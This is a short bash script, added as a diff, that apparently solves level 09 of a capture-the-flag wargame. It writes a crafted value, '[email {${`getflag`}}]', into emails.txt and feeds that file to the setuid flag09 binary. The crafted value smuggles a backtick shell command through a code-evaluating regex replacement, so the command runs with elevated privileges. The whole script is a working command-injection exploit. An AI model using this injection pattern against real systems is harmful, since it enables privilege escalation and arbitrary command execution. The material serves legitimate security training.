@@ -1,0 +1,8 @@
+#!/bin/bash
+
+# Create a file called emails.txt with the shellcode.
+echo '[email {${`getflag`}}]' > /home/level09/emails.txt
+
+# Execute the binary.
+/home/flag09/flag09 /home/level09/emails.txt
+
